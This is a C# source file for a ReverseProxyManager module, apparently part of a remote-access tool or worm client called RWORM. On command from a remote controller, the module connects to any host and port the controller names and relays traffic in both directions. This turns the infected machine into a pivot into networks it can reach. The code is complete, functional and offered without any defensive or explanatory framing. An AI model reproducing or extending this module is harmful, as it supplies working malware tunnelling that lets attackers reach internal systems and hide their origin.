using System;
using System.Collections.Concurrent;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace RWORM.Client.Modules
{
    
    
    
    
    
    public class ReverseProxyManager : IDisposable
    {
        private class ProxyChannel : IDisposable
        {
            public int ChannelId { get; }
            public string TargetHost { get; }
            public int TargetPort { get; }
            public TcpClient? Client { get; set; }
            public NetworkStream? Stream { get; set; }
            public CancellationTokenSource Cts { get; }
            public SemaphoreSlim SendLock { get; }
            private int _disposed;

            public bool IsDisposed => Volatile.Read(ref _disposed) != 0;

            public ProxyChannel(int channelId, string targetHost, int targetPort)
            {
                ChannelId = channelId;
                TargetHost = targetHost;
                TargetPort = targetPort;
                Cts = new CancellationTokenSource();
                SendLock = new SemaphoreSlim(1, 1);
            }

            public void Dispose()
            {
                if (Interlocked.Exchange(ref _disposed, 1) != 0) return;
                try { Cts.Cancel(); } catch { }
                try { Stream?.Dispose(); } catch { }
                try { Client?.Close(); } catch { }
                try { Cts.Dispose(); } catch { }
                try { SendLock.Dispose(); } catch { }
            }
        }

        private readonly Func<byte, int, byte[], Task> _sendPacket;
        private readonly ConcurrentDictionary<int, ProxyChannel> _channels = new();
        private volatile bool _active = false;
        private int _disposed = 0;

        public ReverseProxyManager(Func<byte, int, byte[], Task> sendPacket)
        {
            _sendPacket = sendPacket ?? throw new ArgumentNullException(nameof(sendPacket));
        }

        public void Start()
        {
            _active = true;
        }

        public void Stop()
        {
            _active = false;
            foreach (var kvp in _channels)
            {
                if (_channels.TryRemove(kvp.Key, out var channel))
                {
                    channel.Dispose();
                }
            }
        }

        public void HandlePacket(byte opcode, int channelId, byte[] payload)
        {
            if (!_active && opcode != 0x92)
            {
                _active = true;
            }

            switch (opcode)
            {
                case 0x90: 
                    HandleStart(channelId, payload);
                    break;

                case 0x91: 
                    HandleData(channelId, payload);
                    break;

                case 0x92: 
                    CloseChannel(channelId, notifyRemote: false);
                    break;
            }
        }

        private void HandleStart(int channelId, byte[] payload)
        {
            try
            {
                string target = Encoding.UTF8.GetString(payload).Trim();
                int colon = target.LastIndexOf(':');
                if (colon > 0 && int.TryParse(target.Substring(colon + 1), out int port))
                {
                    string host = target.Substring(0, colon).Trim();
                    var channel = new ProxyChannel(channelId, host, port);

                    
                    if (_channels.TryRemove(channelId, out var oldChannel))
                    {
                        oldChannel.Dispose();
                    }

                    _channels[channelId] = channel;
                    _ = Task.Run(() => ConnectAndPumpAsync(channel));
                }
                else
                {
                    CloseChannel(channelId, notifyRemote: true);
                }
            }
            catch
            {
                CloseChannel(channelId, notifyRemote: true);
            }
        }

        private void HandleData(int channelId, byte[] payload)
        {
            if (payload == null || payload.Length == 0) return;

            if (_channels.TryGetValue(channelId, out var channel) && !channel.IsDisposed)
            {
                _ = Task.Run(async () =>
                {
                    try
                    {
                        if (channel.Stream != null && channel.Client != null && channel.Client.Connected)
                        {
                            await channel.SendLock.WaitAsync(channel.Cts.Token);
                            try
                            {
                                await channel.Stream.WriteAsync(payload, 0, payload.Length, channel.Cts.Token);
                                await channel.Stream.FlushAsync(channel.Cts.Token);
                            }
                            finally
                            {
                                channel.SendLock.Release();
                            }
                        }
                    }
                    catch
                    {
                        CloseChannel(channelId, notifyRemote: true);
                    }
                });
            }
        }

        private async Task ConnectAndPumpAsync(ProxyChannel channel)
        {
            var ct = channel.Cts.Token;
            bool connected = false;

            
            for (int attempt = 1; attempt <= 2 && !ct.IsCancellationRequested && _active; attempt++)
            {
                try
                {
                    var tcp = new TcpClient
                    {
                        NoDelay = true,
                        SendTimeout = 15000,
                        ReceiveTimeout = 15000
                    };

                    using (var connectCts = CancellationTokenSource.CreateLinkedTokenSource(ct))
                    {
                        connectCts.CancelAfter(5000); 
                        await tcp.ConnectAsync(channel.TargetHost, channel.TargetPort, connectCts.Token);
                    }

                    if (tcp.Connected)
                    {
                        channel.Client = tcp;
                        channel.Stream = tcp.GetStream();
                        connected = true;
                        break;
                    }
                }
                catch
                {
                    if (attempt < 2 && !ct.IsCancellationRequested && _active)
                    {
                        try { await Task.Delay(300, ct); } catch { }
                    }
                }
            }

            if (!connected || channel.Stream == null || channel.Client == null)
            {
                CloseChannel(channel.ChannelId, notifyRemote: true);
                return;
            }

            
            try
            {
                await _sendPacket(0x90, channel.ChannelId, Array.Empty<byte>());
            }
            catch
            {
                CloseChannel(channel.ChannelId, notifyRemote: false);
                return;
            }

            
            byte[] buffer = new byte[8192];
            try
            {
                while (_active && !ct.IsCancellationRequested && channel.Client.Connected)
                {
                    int read = await channel.Stream.ReadAsync(buffer, 0, buffer.Length, ct);
                    if (read <= 0) break;

                    byte[] chunk = new byte[read];
                    Buffer.BlockCopy(buffer, 0, chunk, 0, read);

                    await _sendPacket(0x91, channel.ChannelId, chunk);
                }
            }
            catch
            {
                
            }
            finally
            {
                CloseChannel(channel.ChannelId, notifyRemote: true);
            }
        }

        private void CloseChannel(int channelId, bool notifyRemote)
        {
            if (_channels.TryRemove(channelId, out var channel))
            {
                channel.Dispose();
            }

            if (notifyRemote)
            {
                try
                {
                    _ = _sendPacket(0x92, channelId, Array.Empty<byte>());
                }
                catch { }
            }
        }

        public void Dispose()
        {
            if (Interlocked.Exchange(ref _disposed, 1) != 0) return;
            Stop();
        }
    }
}
